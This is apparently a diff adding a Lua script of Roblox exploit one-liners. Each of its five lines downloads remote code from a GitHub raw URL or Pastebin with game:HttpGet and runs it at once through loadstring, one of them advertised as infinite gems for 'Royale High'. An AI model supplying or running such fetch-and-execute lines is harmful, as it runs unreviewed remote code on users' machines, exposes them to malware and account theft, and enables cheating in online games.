@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/littlegui/main/WHAT-THE-FUCK"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/w7mJwm0Q"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/eV3kK7gU"))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Cesare0328/my-scripts/main/Royale%20high%20inf%20gems%20updated"),true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/hub/main/Nto%20(2).Lua"))();
